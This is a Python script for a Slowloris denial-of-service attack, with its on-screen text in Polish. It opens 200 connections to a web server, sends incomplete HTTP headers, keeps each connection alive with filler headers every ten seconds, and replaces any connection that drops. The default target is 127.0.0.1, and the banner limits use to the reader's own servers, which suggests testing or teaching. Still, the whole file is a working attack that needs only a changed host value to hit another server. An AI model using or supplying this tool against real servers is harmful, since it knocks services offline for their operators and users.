import socket
import time
import random

HOST           = '127.0.0.1'
PORT           = 8080
SOCKET_COUNT   = 200    
INTERVAL       = 10     
SOCKET_TIMEOUT = 5      


def opening_headers() -> bytes:
    rid = random.randint(1, 99999)
    return (
        f'GET /?id={rid} HTTP/1.1\r\n'
        f'Host: {HOST}:{PORT}\r\n'
        f'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36\r\n'
        f'Accept-Encoding: gzip, deflate\r\n'
        f'Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n'
        f'Accept-Language: pl-PL,pl;q=0.9,en;q=0.8\r\n'
    ).encode()


KEEP_ALIVE_HEADER = b'X-a: b\r\n'


def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.connect((HOST, PORT))
        s.send(opening_headers())
        return s
    except Exception:
        return None


def main():
    print('╔══════════════════════════════════════════════════╗')
    print('║      SLOWLORIS  –  Slow HTTP Headers DoS         ║')
    print('║      CEL: WYŁĄCZNIE WŁASNE SERWERY (127.0.0.1)   ║')
    print('╚══════════════════════════════════════════════════╝')
    print(f'Cel:        {HOST}:{PORT}')
    print(f'Gniazda:    {SOCKET_COUNT}')
    print(f'Interwał:   {INTERVAL} s')
    print('Ctrl+C aby zatrzymać.\n')

    sockets = []
    print(f'Otwieram {SOCKET_COUNT} połączeń ...')
    for i in range(SOCKET_COUNT):
        s = create_socket()
        if s:
            sockets.append(s)
        if (i + 1) % 50 == 0:
            print(f'  Otwarto: {len(sockets)} / {i + 1}')

    print(f'Aktywne gniazda: {len(sockets)}\n')

    try:
        while True:
            print(f'[~] Aktywne gniazda: {len(sockets)}  '
                  f'→ Dosyłam nagłówki podtrzymujące ...')

            closed = []
            for s in sockets:
                try:
                    s.send(KEEP_ALIVE_HEADER)   
                except Exception:
                    closed.append(s)

            for s in closed:
                sockets.remove(s)
                try:
                    s.close()
                except Exception:
                    pass

            missing = SOCKET_COUNT - len(sockets)
            if missing > 0:
                print(f'    Odbudowuję {missing} zamkniętych połączeń ...')
                for _ in range(missing):
                    s = create_socket()
                    if s:
                        sockets.append(s)

            print(f'    Czekam {INTERVAL} s ...')
            time.sleep(INTERVAL)

    except KeyboardInterrupt:
        print('\nZatrzymuję atak — zamykam gniazda ...')
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        print('Zakończono.')


if __name__ == '__main__':
    main()